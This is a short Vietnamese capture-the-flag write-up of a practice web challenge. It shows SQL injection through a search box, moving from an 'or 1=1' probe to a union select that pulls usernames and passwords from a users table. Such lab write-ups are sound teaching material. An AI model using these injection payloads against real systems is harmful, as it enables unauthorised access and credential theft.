Đoán được phần này trang login sẽ không dễ dàng như 2 phần trước, ta thử ở 1 trang khác cũng có input, đó là trang search

Nhập vào input quen thuộc  `'or 1=1'`, kết quả hiện ra như sau:

> *5 result(s) for "' or 1=1--"*
>
> **Système de news / News system** (La mise en place du système de news est désormais effective / News system activated.)
> **Publication du site / Site publication** (Le site est désormais ouvert à toutes et à tous / Site is open)
> **Bienvenu / Welcome** (Bienvenu à tous / Welcome all !)
> **Correction faille / Vulnerability** (Un petit malin a trouvé un trou dans notre nouveau site. Trou bouché ! / Vulnerability fix)
> **Système de recherche / Search Engine** (Un système de recherche nous permet désormais de rechercher une news / News : search engine :))

Vậy ta biết có thể inject sql từ đây. Thường những database lưu dữ liệu ng dùng trong bảng `users`, sửa lại input thành:

`' union select * from users--`

hiện ra thông báo lỗi

> **Warning**:  SQLite3::query(): Unable to prepare statement: 1,  SELECTs to the left and right of UNION do not have the same number of  result columns in **/challenge/web-serveur/ch19/index.php** on line **150**
>  SELECTs to the left and right of UNION do not have the same number of result columns

Ta đoán có thể do bảng News chỉ có 2 trường `name` và `description`(cũng chính là những gì đã hiển thị). Vậy thử sửa lại input lần nữa:

`' union select username,password from users--`

sẽ lấy được password cua admin